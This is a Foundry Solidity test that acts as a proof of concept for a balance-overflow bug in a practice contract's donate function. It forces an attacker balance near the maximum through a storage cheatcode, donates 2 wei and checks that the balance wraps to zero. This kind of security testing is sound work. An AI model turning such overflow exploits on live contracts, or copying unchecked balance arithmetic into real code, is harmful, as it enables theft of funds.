// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrance.sol";

contract ReentranceTest is Test {
    Reentrance public reentrance;
    address attacker = address(1);
    uint256 constant MAX_UINT = type(uint256).max;

    function setUp() public {
        reentrance = new Reentrance();
    }

    function testDonateOverflow() public {
        // Precompute storage slot (maps to logical storage slot 0)
        uint256 mapSlot = 0;
        bytes32 slot = keccak256(abi.encode(attacker, mapSlot));

        // Set attacker's balance to MAX_UINT - 1 via direct storage
        vm.store(
            address(reentrance),
            slot,
            bytes32(MAX_UINT - 1)
        );

        // Capture pre-trigger state
        console.log("--- BEFORE-Trigger Balance Check ---");
        uint256 preBalance = reentrance.balanceOf(attacker);
        console.log("Attacker balance before:", preBalance);
        
        // Validate pre-overflow balance
        assertEq(preBalance, MAX_UINT - 1, "Initial balance incorrect");

        console.log("--- Trigger Donate Call ---");
        // Fund test contract to execute donation
        vm.deal(address(this), 2);
        
        // Critical vulnerability trigger
        reentrance.donate{value: 2}(attacker);
        
        console.log("--- AFTER-Trigger Balance Check ---");
        // Capture post-trigger state
        uint256 postBalance = reentrance.balanceOf(attacker);
        console.log("Attacker balance after:", postBalance);
        
        // Validate overflow occurred
        assertEq(postBalance, 0, "Overflow not detected");

        // Final vulnerability verdict
        if (postBalance == 0) {
            console.log("Vulnerability confirmed: Balance overflow occurred");
        } else {
            console.log("Vulnerability not confirmed: Balance did not overflow");
        }

        // Print final verdict line
        if (preBalance == MAX_UINT - 1 && postBalance == 0) {
            console.log("Vulnerability Exists: overflow attack successfully executed");
        } else {
            console.log("Vulnerability not Exist: conditions for overflow not met");
        }
    }
}